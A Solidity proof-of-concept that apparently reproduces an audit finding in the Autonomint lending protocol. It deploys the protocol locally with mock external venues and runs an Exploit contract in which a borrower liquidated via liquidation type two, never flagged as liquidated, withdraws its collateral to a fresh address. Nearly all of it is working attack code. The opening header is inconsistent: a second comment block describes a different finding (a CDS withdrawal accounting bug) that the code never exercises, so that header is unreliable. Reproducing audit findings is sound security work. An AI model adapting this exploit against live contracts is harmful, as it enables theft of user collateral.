// SPDX-License-Identifier: MIT
// Cheatcode-free reproduction of Autonomint H-10 (Sherlock #696 / AuditVault 45463):
// borrowLiquidation.liquidationType2 never sets depositDetail.liquidated = true, so a
// borrower liquidated via a Synthetix short hedge can still withdraw its collateral.
pragma solidity 0.8.22;

// Cheatcode-free, single-transaction reproduction of Autonomint H-12 (Sherlock
// #738 / AuditVault 45465) for the in-browser EVM Playground. It deploys the REAL
// audited Autonomint protocol (Core_logic + lib + the repo's own Copy test twins +
// EndpointV2Mock LayerZero stack) with minimal real doubles for the opaque external
// venues (Ionic lending, WETH, Synthetix, RedStone oracle) and executes the real
// accounting bug: a CDS depositor withdrawing at a loss decrements
// totalCdsDepositedAmount by the loss-adjusted return amount instead of the original
// deposit, leaving the pool aggregate above the sum of the remaining real deposits.

import {BorrowingTest} from "../src/TestContracts/CopyBorrowing.sol";
import {CDSTest} from "../src/TestContracts/CopyCDS.sol";
import {TestUSDaStablecoin} from "../src/TestContracts/CopyUSDa.sol";
import {TestABONDToken} from "../src/TestContracts/Copy_Abond_Token.sol";
import {TestUSDT} from "../src/TestContracts/CopyUsdt.sol";
import {WEETH} from "../src/TestContracts/MockWeETH.sol";
import {RSETH} from "../src/TestContracts/MockRsETH.sol";
import {EndpointV2Mock} from "../src/TestContracts/EndpointV2Mock.sol";
import {Treasury} from "../src/Core_logic/Treasury.sol";
import {GlobalVariables} from "../src/Core_logic/GlobalVariables.sol";
import {Options} from "../src/Core_logic/Options.sol";
import {MultiSign} from "../src/Core_logic/multiSign.sol";
import {BorrowLiquidation} from "../src/Core_logic/borrowLiquidation.sol";
import {MasterPriceOracle} from "../src/oracles/MasterPriceOracle.sol";
import {IBorrowing} from "../src/interface/IBorrowing.sol";
import {IOptions} from "../src/interface/IOptions.sol";
import {ITreasury} from "../src/interface/ITreasury.sol";
import {IGlobalVariables} from "../src/interface/IGlobalVariables.sol";
import {OptionsBuilder} from "@layerzerolabs/lz-evm-oapp-v2/contracts/oapp/libs/OptionsBuilder.sol";
import {WETH9Double, IonicDouble, SynthetixWrapperDouble, SynthetixExchangeDouble, PerpsV2Double, RedstoneOracleDouble} from "../src/testmocks/ExternalDoubles.sol";

/// @dev Generic actor: lets the Exploit act as a distinct msg.sender (co-owner,
/// second depositor, borrower) without cheatcodes.
contract Actor {
    function exec(address target, uint256 value, bytes calldata data) external payable returns (bytes memory) {
        (bool ok, bytes memory ret) = target.call{value: value}(data);
        require(ok, "actor: call failed");
        return ret;
    }
    receive() external payable {}
}

contract AutonomintDeployer {
    using OptionsBuilder for bytes;

    struct Set {
        TestUSDaStablecoin usda;
        TestABONDToken abond;
        MultiSign multiSign;
        TestUSDT usdt;
        CDSTest cds;
        GlobalVariables global;
        BorrowingTest borrow;
        BorrowLiquidation borrowLiquidation;
        Treasury treasury;
        Options option;
        WEETH weeth;
        RSETH rseth;
    }

    Set internal A;
    Set internal B;
    EndpointV2Mock internal epA;
    EndpointV2Mock internal epB;
    RedstoneOracleDouble internal oracle;
    Actor internal coOwner;      // owners[1]
    address internal thirdOwner; // owners[2]
    address[] internal owners;
    uint8[] internal fns;
    WETH9Double internal wethA; IonicDouble internal ionicA;
    WETH9Double internal wethB; IonicDouble internal ionicB;

    address internal constant ETH_SENTINEL = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    uint32 internal constant eidA = 1;
    uint32 internal constant eidB = 2;

    function _deployAll() internal {
        coOwner = new Actor();
        thirdOwner = address(new Actor());
        owners = [address(this), address(coOwner), thirdOwner];
        fns = [0,1,2,3,4,5,6,7,8,9];

        epA = new EndpointV2Mock(eidA);
        epB = new EndpointV2Mock(eidB);
        oracle = new RedstoneOracleDouble();

        A = _deploySet(epA, true);
        B = _deploySet(epB, false);

        epA.setDestLzEndpoint(address(B.usda), address(epB));
        epA.setDestLzEndpoint(address(B.usdt), address(epB));
        epA.setDestLzEndpoint(address(B.global), address(epB));
        epA.setDestLzEndpoint(address(B.weeth), address(epB));
        epA.setDestLzEndpoint(address(B.rseth), address(epB));
        epB.setDestLzEndpoint(address(A.usda), address(epA));
        epB.setDestLzEndpoint(address(A.usdt), address(epA));
        epB.setDestLzEndpoint(address(A.global), address(epA));
        epB.setDestLzEndpoint(address(A.weeth), address(epA));
        epB.setDestLzEndpoint(address(A.rseth), address(epA));

        _wire();
    }

    function _deploySet(EndpointV2Mock ep, bool isA) internal returns (Set memory c) {
        c.usda = new TestUSDaStablecoin();
        c.abond = new TestABONDToken();
        c.multiSign = new MultiSign();
        c.usdt = new TestUSDT();
        c.cds = new CDSTest();
        c.borrow = new BorrowingTest();
        c.treasury = new Treasury();
        c.option = new Options();
        c.borrowLiquidation = new BorrowLiquidation();
        c.global = new GlobalVariables();
        c.weeth = new WEETH();
        c.rseth = new RSETH();

        c.weeth.initialize(address(ep), address(this));
        c.rseth.initialize(address(ep), address(this));

        address[] memory pf = new address[](4);
        pf[0] = address(oracle); pf[1] = address(oracle); pf[2] = address(oracle); pf[3] = address(oracle);
        address[] memory col = new address[](4);
        col[0] = ETH_SENTINEL; col[1] = address(c.weeth); col[2] = address(c.rseth); col[3] = address(c.rseth);
        MasterPriceOracle mpo = new MasterPriceOracle(col, pf);

        address[] memory tk = new address[](3);
        tk[0] = address(c.usda); tk[1] = address(c.abond); tk[2] = address(c.usdt);

        c.usda.initialize(address(ep), address(this));
        c.abond.initialize();
        c.multiSign.initialize(owners, 2);
        c.usdt.initialize(address(ep), address(this));
        c.cds.initialize(address(c.usda), address(mpo), address(c.usdt), address(c.multiSign));
        c.global.initialize(address(c.usda), address(c.cds), address(ep), address(this));
        c.borrow.initialize(address(c.usda), address(c.cds), address(c.abond), address(c.multiSign), address(mpo), col, tk, uint64(block.chainid), address(c.global));

        WETH9Double weth = new WETH9Double();
        IonicDouble ionic = new IonicDouble(address(weth));
        SynthetixWrapperDouble wr = new SynthetixWrapperDouble();
        SynthetixExchangeDouble sx = new SynthetixExchangeDouble();
        PerpsV2Double px = new PerpsV2Double();

        c.borrowLiquidation.initialize(address(c.borrow), address(c.cds), address(c.usda), address(c.global), address(weth), address(wr), address(px), address(sx));
        c.treasury.initialize(address(c.borrow), address(c.usda), address(c.abond), address(c.cds), address(c.borrowLiquidation), address(c.usdt), address(c.global));
        c.option.initialize(address(c.treasury), address(c.cds), address(c.borrow), address(c.global));

        if (isA) { wethA = weth; ionicA = ionic; } else { wethB = weth; ionicB = ionic; }
    }

    function _approveMulti(MultiSign ms) internal {
        ms.approveSetterFunction(fns); // owner[0] = this
        coOwner.exec(address(ms), 0, abi.encodeWithSelector(MultiSign.approveSetterFunction.selector, fns)); // owner[1]
    }

    function _wire() internal {
        A.weeth.setPeer(eidB, bytes32(uint256(uint160(address(B.weeth)))));
        A.rseth.setPeer(eidB, bytes32(uint256(uint160(address(B.rseth)))));
        B.weeth.setPeer(eidA, bytes32(uint256(uint160(address(A.weeth)))));
        B.rseth.setPeer(eidA, bytes32(uint256(uint160(address(A.rseth)))));
        A.usda.setPeer(eidB, bytes32(uint256(uint160(address(B.usda)))));
        A.usdt.setPeer(eidB, bytes32(uint256(uint160(address(B.usdt)))));
        A.global.setPeer(eidB, bytes32(uint256(uint160(address(B.global)))));
        B.usda.setPeer(eidA, bytes32(uint256(uint160(address(A.usda)))));
        B.usdt.setPeer(eidA, bytes32(uint256(uint160(address(A.usdt)))));
        B.global.setPeer(eidA, bytes32(uint256(uint160(address(A.global)))));
        A.usda.setDstEid(eidB); A.usdt.setDstEid(eidB); A.global.setDstEid(eidB);
        B.usda.setDstEid(eidA); B.usdt.setDstEid(eidA); B.global.setDstEid(eidA);

        _wireSet(A, wethA, ionicA, address(B.global));
        _wireSet(B, wethB, ionicB, address(A.global));

        _approveMulti(A.multiSign);
        _approveMulti(B.multiSign);

        _configSet(A, wethA, ionicA);
        _configSet(B, wethB, ionicB);
        A.borrow.calculateCumulativeRate();
        B.borrow.calculateCumulativeRate();
    }

    function _wireSet(Set memory c, WETH9Double weth, IonicDouble ionic, address dstGlobal) internal {
        c.usda.setBorrowingContract(address(c.borrow));
        c.usda.setCdsContract(address(c.cds));
        c.usda.setTreasuryContract(address(c.treasury));
        c.abond.setBorrowingContract(address(c.borrow));
        c.global.setTreasury(address(c.treasury));
        c.global.setBorrowLiq(address(c.borrowLiquidation));
        c.global.setBorrowing(address(c.borrow));
        c.global.setDstGlobalVariablesAddress(dstGlobal);
        c.borrowLiquidation.setTreasury(address(c.treasury));
        // admin must be an EOA (isContract check). address(this) has codesize 0
        // during the constructor, so it passes; afterwards the deployed Exploit
        // (with code) is the admin and can call onlyAdmin functions.
        c.borrowLiquidation.setAdmin(address(this));
    }

    function _configSet(Set memory c, WETH9Double weth, IonicDouble ionic) internal {
        c.borrow.setAdmin(address(this));
        c.borrow.setTreasury(address(c.treasury));
        c.borrow.setOptions(address(c.option));
        c.borrow.setBorrowLiquidation(address(c.borrowLiquidation));
        c.borrow.setLTV(80);
        c.borrow.setBondRatio(4);
        c.borrow.setAPR(50, 1000000000000000000000000000); // 0% interest (single-block)
        c.cds.setAdmin(address(this));
        c.cds.setTreasury(address(c.treasury));
        c.cds.setBorrowingContract(address(c.borrow));
        c.cds.setBorrowLiquidation(address(c.borrowLiquidation));
        c.cds.setUSDaLimit(80);
        c.cds.setUsdtLimit(20000000000);
        c.cds.setGlobalVariables(address(c.global));
        c.treasury.setExternalProtocolAddresses(address(ionic), address(weth), address(weth));
    }

    function _feeA(IGlobalVariables.FunctionToDo f, uint128 gas) internal view returns (uint256) {
        bytes memory o = OptionsBuilder.newOptions().addExecutorLzReceiveOption(gas, 0);
        return A.global.quote(f, IBorrowing.AssetName.DUMMY, o, false).nativeFee;
    }
}


contract Exploit is AutonomintDeployer {
    uint64 constant P1000 = 1000e2;
    // fresh EOA that receives the reclaimed collateral (profit receiver)
    address constant RECIP = 0x0000000000000000000000000000000000012345;

    address public borrowLiqA;
    bool public liquidatedFlag;
    uint256 public recipGain;

    receive() external payable {}

    // Deploy + wire the whole protocol in the constructor so setAdmin(address(this))
    // passes the EOA check (codesize 0 during construction); afterwards this contract
    // is the protocol admin and can call the onlyAdmin liquidate().
    constructor() {
        _deployAll();
        borrowLiqA = address(A.borrowLiquidation);
    }

    function run() external payable {
        Actor borrower = new Actor();
        payable(address(borrower)).transfer(5 ether);
        uint256 fee = _feeA(IGlobalVariables.FunctionToDo.UPDATE_GLOBAL, 400000);

        // CDS liquidity so the borrow satisfies the >=2x CDS/volume ratio.
        A.usdt.mint(address(this), 6000e6);
        A.usdt.approve(address(A.cds), 6000e6);
        A.cds.deposit{value: fee}(6000e6, 0, true, 6000e6, P1000);

        // Borrower (a distinct actor) deposits 1 ETH at price 1000.
        borrower.exec{value: 1 ether + fee}(
            address(A.borrow),
            1 ether + fee,
            abi.encodeWithSelector(
                BorrowingTest.depositTokens.selector,
                P1000,
                uint64(block.timestamp),
                IBorrowing.BorrowDepositParams(IOptions.StrikePrice.TEN, 110000, uint256(50622665), IBorrowing.AssetName.ETH, uint256(1 ether))
            )
        );

        // Admin (this contract) liquidates the borrower via TYPE TWO. currentEthPrice
        // = 1000 (a ~99% crash in the protocol's 2-decimal scale) -> ratio 100 <= 8000,
        // and small enough that liquidationType2's own uint64*1e16 math does not overflow.
        uint256 liqFee = _feeA(IGlobalVariables.FunctionToDo(2), 400000);
        A.borrow.liquidate{value: 1 ether + liqFee}(address(borrower), 1, 1000, IBorrowing.LiquidationType.TWO);

        // BUG (borrowLiquidation.liquidationType2): the position is never marked
        // liquidated, so the borrower's claim survives the liquidation.
        ITreasury.GetBorrowingResult memory gb = A.treasury.getBorrowing(address(borrower), 1);
        liquidatedFlag = gb.depositDetails.liquidated;
        require(!liquidatedFlag, "type2 unexpectedly marked liquidated");

        // The liquidated borrower withdraws its collateral into a fresh EOA. Top up
        // USDa so it can repay the debt (as the finding's attack path allows).
        A.usda.mint(address(borrower), 2000e6);
        borrower.exec(address(A.usda), 0, abi.encodeWithSelector(A.usda.approve.selector, address(A.borrow), uint256(2000e6)));

        uint256 recipBefore = RECIP.balance;
        uint256 wfee = _feeA(IGlobalVariables.FunctionToDo(1), 350000) + _feeA(IGlobalVariables.FunctionToDo(1), 400000);
        borrower.exec{value: wfee}(
            address(A.borrow),
            wfee,
            abi.encodeWithSelector(BorrowingTest.withDraw.selector, RECIP, uint64(1), bytes("0x"), bytes("0x"), P1000, uint64(block.timestamp))
        );
        recipGain = RECIP.balance - recipBefore;

        // HARM: a liquidated borrower reclaimed real collateral from the treasury.
        require(recipGain > 0, "no collateral reclaimed after liquidation");
    }
}
